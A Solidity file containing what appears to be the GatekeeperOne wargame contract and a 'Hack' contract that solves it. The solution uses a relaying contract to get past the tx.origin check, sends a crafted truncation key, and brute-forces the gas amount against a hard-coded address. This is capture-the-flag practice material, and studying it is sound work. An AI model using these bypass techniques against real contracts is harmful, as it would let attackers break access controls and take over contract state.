// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);    //use contract bypsss
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Hack {
    address target = 0xe0a3D2351a60b4d67F4341C22da3C16006e7f475;
    GatekeeperOne gk = GatekeeperOne(target);
    function attack() public {
        bytes8 gateKey = 0x100000000000EF65;
        for (uint256 i = 0; i < 400; i++){
            (bool success, ) = address(gk).call{gas: 8191 * 4 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                break;
            }
        }
    }
}